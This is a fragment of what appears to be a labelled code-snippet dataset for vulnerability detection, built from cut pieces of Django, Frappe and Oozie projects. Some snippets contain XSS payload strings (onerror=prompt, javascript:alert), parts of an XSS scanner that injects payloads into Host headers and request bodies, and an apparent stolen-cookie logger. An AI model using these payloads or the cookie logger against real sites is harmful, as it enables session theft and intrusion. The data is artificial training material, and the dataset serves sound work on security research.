except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self,", "label": 0}, {"snippet_id": 53707, "code": "=FileSystemLoader(UTILS_DIR)) return j2_env.get_template('templates/eb/config.yml').render( APPLICATION_NAME=application_name, DEFAULT_REGION=default_region ) def write_eb_config(dest, application_name", "label": 1}, {"snippet_id": 30121, "code": " |egrep -v '::1' |awk '{ print $2 }' |awk -F'/' '{ print $1 }'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue('showif'): \tcommands=[\"sudo ip link|grep 'UP' | awk '{print $2}' |awk -F':' '", "label": 0}, {"snippet_id": 41450, "code": " reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %", "label": 0}, {"snippet_id": 37688, "code": ".published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication`", "label": 0}, {"snippet_id": 34934, "code": "[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database", "label": 0}, {"snippet_id": 7068, "code": " 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$", "label": 0}, {"snippet_id": 27899, "code": "'error.html', values, 500) def redirect(self, url, **kwargs): \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect strongly requires 'str' but url might be an unicode string.\"\"\"", "label": 0}, {"snippet_id": 51808, "code": " 'default key provided. Please create a new key. Instructions are listed here:' 'https://github.com/pyca/cryptography. In short, run: key=Fernet.generate_key()') LOGGING={ 'version': 1, 'disable_existing_loggers", "label": 0}, {"snippet_id": 49181, "code": ".{}'.format(self.column_id, \".\".join(new_query)) }) else: return self.get_reverse_sort_by() def get_remove_sort_by(self): new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"", "label": 0}, {"snippet_id": 37197, "code": " from __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils", "label": 1}, {"snippet_id": 5627, "code": ">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', ", "label": 0}, {"snippet_id": 8222, "code": "]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register", "label": 0}, {"snippet_id": 6398, "code": " CherryPy SSL adapter class to use(must be one of cherrypy.wsgiserver.ssl_adapters) \"\"\" return self.config.get(self.section, 'ssl_adapter') @property def server_cert(self): \"\"\" SSL certificate filename(None", "label": 0}, {"snippet_id": 17518, "code": "(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if", "label": 0}, {"snippet_id": 40895, "code": " False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t", "label": 0}, {"snippet_id": 49618, "code": "[ SmartFilter(self.model, field, self.query_params, self.object_list) for i, field in enumerate(self.list_filter, start=1) ] if self.list_filter else[] def get_columns(self): \"\"\" Transform list_display", "label": 0}, {"snippet_id": 28006, "code": " local_config.ProjectConfig().get('firebase.api_key'), 'authDomain': auth.auth_domain(), 'dest': self.request.get('dest'), }) class SessionLoginHandler(base_handler.Handler): \"\"\"Session login handler.\"\"", "label": 1}, {"snippet_id": 33493, "code": ", global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on", "label": 1}, {"snippet_id": 43366, "code": ".items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown --", "label": 0}, {"snippet_id": 3232, "code": " temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers", "label": 0}, {"snippet_id": 9387, "code": "/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading", "label": 0}, {"snippet_id": 49268, "code": "=None): self.model=model self.field_name=field self.label=label self.render_function=render_function self.order_field=None self.order=None if not self.field_name: return if self.field_name.startswith(\"_\")", "label": 0}, {"snippet_id": 40713, "code": "\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" ", "label": 0}, {"snippet_id": 26019, "code": "-display-dependency': ' 'internal_reference': forms.TextInput, } labels={ 'is_business': '' } def __init__(self, *args, **kwargs): self.event=event=kwargs.pop('event') self.request=kwargs.pop('request', None)", "label": 0}, {"snippet_id": 32702, "code": "'text/html') self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write(md_fragment) self.wfile.write('</div>') self._WriteTemplate('footer.html') except: raise def _DoRawSourceFile", "label": 0}, {"snippet_id": 27293, "code": "(url) s=r.content.replace(\">\", \">\\n\") with open(\"tmpage.txt\", \"w\") as f: f.write(s) scan_for_forms(\"tmpage.txt\", host, url) os.remove(\"tmpage.txt\") except Exception, e: print \"[-] Main(): Error \" +str(e)", "label": 1}, {"snippet_id": 48762, "code": "(request.GET[\"rid\"])) if(aid.RID.createdByUser==u or u.rights > 1) and aid.RID==r and not r.submitted: aid.delete() else: return HttpResponseRedirect(\"/admin?error=You're%20not%20allowed%20to%20do%20this\")", "label": 0}, {"snippet_id": 21939, "code": ".provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$',", "label": 0}, {"snippet_id": 17710, "code": "'create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration',", "label": 0}, {"snippet_id": 19477, "code": ") suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): ", "label": 0}, {"snippet_id": 7770, "code": "?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress", "label": 0}, {"snippet_id": 36276, "code": " a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self", "label": 0}, {"snippet_id": 54127, "code": "(datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"),int(time.time()-ti))) print(\"=\"*25) stop=False def scan(): sc().start() class ki(threading.Thread): def run(self): global stop stop=True def kill(): ki().start", "label": 0}, {"snippet_id": 37977, "code": ".blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content", "label": 0}, {"snippet_id": 51422, "code": " gettext_lazy as _ BASE_DIR=os.path.dirname(os.path.abspath(__file__)) SETTINGS_PATH=os.path.normpath(os.path.dirname(__file__)) SECRET_KEY='_dzlo^9d DEBUG=True ALLOWED_HOSTS=[] INSTALLED_APPS=[ 'constance'", "label": 0}, {"snippet_id": 37004, "code": "\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions", "label": 0}, {"snippet_id": 51398, "code": "/en/2.1/topics/settings/ For the full list of settings and their values, see https://docs.djangoproject.com/en/2.1/ref/settings/ \"\"\" import os from datetime import timedelta from django.utils.translation", "label": 0}, {"snippet_id": 3157, "code": ", \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post_request.headers) if db_update is not True", "label": 0}, {"snippet_id": 49635, "code": " into list of SmartColumns In list_display we expect: 1. name of the field(string) or 2. two element iterable in which: -first element is name of the field(string) or callable which returns html -label", "label": 0}, {"snippet_id": 1787, "code": ".logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split", "label": 0}, {"snippet_id": 51847, "code": ")20s() -%(message)s', }, 'color':{ '()': 'colorlog.ColoredFormatter', 'format': '%(log_color)s%(asctime)s\\t%(levelname)-8s -' '%(message)s', 'datefmt': '%Y-%m-%d %H:%M', 'log_colors':{ 'DEBUG': 'green',", "label": 0}, {"snippet_id": 12264, "code": "/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware", "label": 1}, {"snippet_id": 35871, "code": " after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter", "label": 0}, {"snippet_id": 4620, "code": ", 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre'", "label": 0}, {"snippet_id": 45866, "code": "'coord_%s_dir' % i]=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id", "label": 0}, {"snippet_id": 33625, "code": "\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -", "label": 0}, {"snippet_id": 7209, "code": "'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id", "label": 0}, {"snippet_id": 23786, "code": ".assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd", "label": 0}, {"snippet_id": 40262, "code": " not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script", "label": 0}, {"snippet_id": 49479, "code": "], choice[0], self.query_params) for choice in self.model_field.lookups() ] elif self.model_field.choices: values=[ SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice", "label": 0}, {"snippet_id": 18136, "code": "'change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"", "label": 0}, {"snippet_id": 2654, "code": "\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads", "label": 0}, {"snippet_id": 34394, "code": ".__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t", "label": 0}, {"snippet_id": 43907, "code": "\tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !", "label": 0}, {"snippet_id": 4836, "code": " src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\", \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url", "label": 0}, {"snippet_id": 29565, "code": "\tcontinue \t\t\t\t \t\tif kwargs.get(\"ip\")==\"1\": \t\t\tshow_ip(stdout) \t\telif kwargs.get(\"show_log\")==\"1\": \t\t\tshow_log(stdout) \t\telif kwargs.get(\"server_status\")==\"1\": \t\t\tserver_status(stdout) \t\telif kwargs.get", "label": 0}, {"snippet_id": 8389, "code": "): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"", "label": 0}, {"snippet_id": 41959, "code": " \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument,", "label": 0}, {"snippet_id": 23771, "code": ".shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name))", "label": 0}, {"snippet_id": 44779, "code": "/json\") def action_parameters(request): response={'status': -1} parameters=set() try: node_data=json.loads(request.POST.get('node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters()", "label": 0}, {"snippet_id": 28098, "code": ".revoke_session_cookie(auth.get_session_cookie()) except auth.AuthError: logs.log_error('Failed to revoke session cookie.') self.response.delete_cookie('session') self.redirect(self.request.get('dest'))", "label": 0}, {"snippet_id": 36630, "code": ".get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro", "label": 0}, {"snippet_id": 20568, "code": "{allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self", "label": 0}, {"snippet_id": 54264, "code": "'xss.txt') pl=[] for x in li: pl.append(x.strip()) prox=[\"\"] prox+=bane.http(200) global target target=Entry(main) target.insert(0,'http://') global cookie cookie=Entry(main) global method method=ttk.Combobox", "label": 1}, {"snippet_id": 13966, "code": "', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list", "label": 0}, {"snippet_id": 15428, "code": "() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums", "label": 0}, {"snippet_id": 1434, "code": ", methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults", "label": 0}, {"snippet_id": 22173, "code": "', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r", "label": 0}, {"snippet_id": 52932, "code": "): coordinator_id=request.GET.get('coordinator') doc=None if coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie", "label": 0}, {"snippet_id": 11414, "code": " zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir", "label": 0}, {"snippet_id": 50784, "code": "=True) options=kwargs.pop(\"options\",{}) raw=options.get(\"raw\", flags.get(\"RAW\", False)) xterm256=options.get(\"xterm256\", flags.get('XTERM256', True)) useansi=options.get(\"ansi\", flags.get('ANSI', True)", "label": 0}, {"snippet_id": 49041, "code": ") for column in self.smart_list.columns ] class SmartOrder(QueryParamsMixin, object): def __init__(self, query_params, column_id, ordering_query_param): self.query_params=query_params self.column_id=column_id", "label": 0}, {"snippet_id": 28209, "code": "<br />Can\\'t read import config file' \tos.system(\"/bin/mv %s %s.old\" %(cfg, cfg))\t if serv is not None and form.getvalue('config') is not None: \ttry: \t\tfunct.logging(serv, \"config.py edited config\") \texcept", "label": 0}, {"snippet_id": 44436, "code": "() def copy_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get", "label": 0}, {"snippet_id": 44490, "code": ".doc.add(copy_doc) workflow=Workflow(document=doc2) workflow.update_name(name) doc2.update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace", "label": 0}, {"snippet_id": 55001, "code": "\"Update translation memory for a list of translations. \"\"\" memory_entries=[ TranslationMemoryEntry( source=t.entity.string, target=t.string, locale=locale, entity=t.entity, translation=t, project=project,", "label": 0}, {"snippet_id": 28037, "code": " expires_in=datetime.timedelta(days=SESSION_EXPIRY_DAYS) try: session_cookie=auth.create_session_cookie(id_token, expires_in) except auth.AuthError: raise helpers.EarlyExitException('Failed to create session", "label": 0}, {"snippet_id": 20374, "code": " environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if", "label": 0}, {"snippet_id": 22931, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P", "label": 0}, {"snippet_id": 976, "code": " scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result", "label": 1}, {"snippet_id": 54237, "code": ".grid(row=7) Label(main, text=\"Crawl\",background='light sky blue').grid(row=8) Label(main, text=\"\",background='light sky blue').grid(row=9) Label(main, text=\"\",background='light sky blue').grid(row=10)", "label": 0}, {"snippet_id": 31728, "code": ".close \t\tprint(file_read) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read '+form.getvalue('color')+' list</div>') \t\t if form.getvalue('bwlists_create'): \tlist_name", "label": 0}, {"snippet_id": 24711, "code": " servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory", "label": 0}, {"snippet_id": 9455, "code": "[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 5299, "code": "'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark", "label": 0}, {"snippet_id": 25110, "code": "\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '", "label": 0}, {"snippet_id": 33939, "code": ": \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category", "label": 0}, {"snippet_id": 47950, "code": "\"allowed_reservations\"]) user.displayName=displayname user.authuser=auth_user user.dect=dect user.notes=notes user.active=True user.save() pass pass except Exception as e: return HttpResponseBadRequest(str(e)) return", "label": 0}, {"snippet_id": 488, "code": ": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url", "label": 0}, {"snippet_id": 39481, "code": "\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError", "label": 0}, {"snippet_id": 44210, "code": " RestException from desktop.models import Document, Document2 from liboozie.credentials import Credentials from liboozie.oozie_api import get_oozie from liboozie.submission2 import Submission from oozie", "label": 0}, {"snippet_id": 9823, "code": ".MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url", "label": 0}, {"snippet_id": 24398, "code": " http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', ", "label": 0}, {"snippet_id": 35621, "code": ".fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants", "label": 0}, {"snippet_id": 15923, "code": "(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course", "label": 0}, {"snippet_id": 18221, "code": "/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses", "label": 1}, {"snippet_id": 17079, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id", "label": 0}, {"snippet_id": 16282, "code": "=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': ", "label": 0}, {"snippet_id": 11548, "code": ">[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r", "label": 0}, {"snippet_id": 37518, "code": ".title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\")", "label": 1}, {"snippet_id": 47937, "code": " auth_user.save() user: Profile=Profile() user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) user.displayName=displayname user.authuser=auth_user user.dect=dect", "label": 0}, {"snippet_id": 9078, "code": "\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name", "label": 0}, {"snippet_id": 53944, "code": ",mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n') \t\tprint(colored('\\n\\n[+] ','green')+'New Cookie..\\n\\n') \t\treturn 'Thanks:)' if __name__=='__main__'", "label": 0}, {"snippet_id": 48586, "code": " else: sr=SubReservation.objects.get(id=srid) if request.POST.get(\"notes\"): sr.notes=request.POST[\"notes\"] else: sr.notes=\" \" sr.primary_reservation=GroupReservation.objects.get(id=int(request.GET[\"rid\"", "label": 1}, {"snippet_id": 32530, "code": ".SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.bind(self.server_address) class Handler(SimpleHTTPServer.SimpleHTTPRequestHandler): def do_GET(self): path=self.path if path.startswith('/chromium/src/+/master'", "label": 0}, {"snippet_id": 6863, "code": " will be forgotten. \"\"\" return self.config.getint(self.section, 'login_state_ttl') @property def default_scoped_affiliation(self): \"\"\" Add a default eduPersonScopedAffiliation if none is returned from the", "label": 0}, {"snippet_id": 50169, "code": ", csessid, data): \"\"\" This adds the data to the buffer and/or sends it to the client as soon as possible. Args: csessid(int): Session id. data(list): A send structure[cmdname,[args],{kwargs}]. \"\"\" request", "label": 0}, {"snippet_id": 17595, "code": "'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$", "label": 0}, {"snippet_id": 3633, "code": "\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers", "label": 0}, {"snippet_id": 36285, "code": "\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True", "label": 0}, {"snippet_id": 42529, "code": "'name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in", "label": 0}, {"snippet_id": 28412, "code": " \t\t\t\t\t def get_data(type): \tfrom datetime import datetime \tfrom pytz import timezone \timport sql \tnow_utc=datetime.now(timezone(sql.get_setting('time_zone'))) \tif type=='config': \t\tfmt=\"%Y-%m-%d.%H:%M:", "label": 0}, {"snippet_id": 18818, "code": "', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),", "label": 0}, {"snippet_id": 41255, "code": ".sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: ", "label": 1}, {"snippet_id": 27406, "code": " cgi.FieldStorage): return str(obj) else: raise Exception('Cannot serialise %s' % obj) def format_time(dt): \"\"\"Format datetime object for display.\"\"\" return '{t.day}{t:%b}{t:%y}{t:%X} PDT'.format(t=dt)", "label": 0}, {"snippet_id": 41406, "code": ".local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content", "label": 0}, {"snippet_id": 11386, "code": "=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green", "label": 0}, {"snippet_id": 12660, "code": "/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab", "label": 0}, {"snippet_id": 18017, "code": ".views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$'", "label": 0}, {"snippet_id": 32456, "code": " Unused. This is actually a configurable string that is used as a replacement character for spaces in the title, typically set to '-'. Since we emulate Gitiles' way of slugification here, it makes little", "label": 0}, 